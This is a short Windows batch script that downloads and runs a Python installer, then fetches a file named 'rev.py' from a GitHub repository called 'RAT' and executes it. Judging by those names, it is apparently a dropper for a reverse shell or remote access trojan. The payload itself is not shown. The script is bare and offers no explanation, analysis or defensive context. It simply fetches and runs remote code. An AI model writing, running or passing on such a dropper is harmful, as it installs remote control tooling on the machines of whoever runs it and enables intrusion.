@echo off
curl -o python-installer.exe https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe
python-installer.exe
curl -o rev.py https://raw.githubusercontent.com/saifnasef/RAT/main/rev.py
python3 rev.py